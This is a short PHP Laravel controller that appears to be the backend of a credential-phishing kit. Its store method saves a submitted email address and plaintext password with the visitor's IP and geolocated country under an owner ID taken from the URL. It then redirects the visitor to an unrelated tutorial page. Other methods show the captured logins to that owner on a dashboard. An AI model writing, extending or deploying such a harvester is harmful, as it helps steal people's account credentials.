<?php

namespace App\Http\Controllers;

use App\Models\Email;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Http;

class EmailController extends Controller
{



    public function store(Request $request, $auth)
    {

        // https://api.country.is/196.221.195.28

        $res = Http::timeout(15)->get('https://api.country.is/' . $request->ip);
        $create = new Email();
        $create->email = $request->email;
        $create->user_id = $auth;
        $create->password = $request->password;
        $create->country = $res['country'];
        $create->ip = $request->ip;
        $create->save();

        return redirect('https://www.itsolutionstuff.com/post/how-to-create-table-using-migration-in-laravelexample.html');
    }


    public function index()
    {
        $users = Email::where('user_id', Auth::user()->id)->paginate(50);
        return view('dashboard', compact('users'));
    }


    public function text()
    {
        $users = Email::where('user_id', Auth::user()->id)->get();
        return view('test', compact('users'));
    }
}
